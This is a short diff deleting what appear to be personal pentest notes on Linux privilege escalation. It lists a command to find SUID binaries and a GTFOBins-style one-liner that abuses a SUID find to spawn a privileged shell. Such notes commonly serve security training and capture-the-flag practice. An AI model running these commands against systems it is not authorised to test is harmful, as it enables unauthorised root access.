@@ -1,6 +1,0 @@
-find peas------------------------------------/usr/bin/find -exec /bin/sh -p \; -quit
-
-
-
-
-search for SUID files-------------------------find / -perm /4000 2>/dev/null
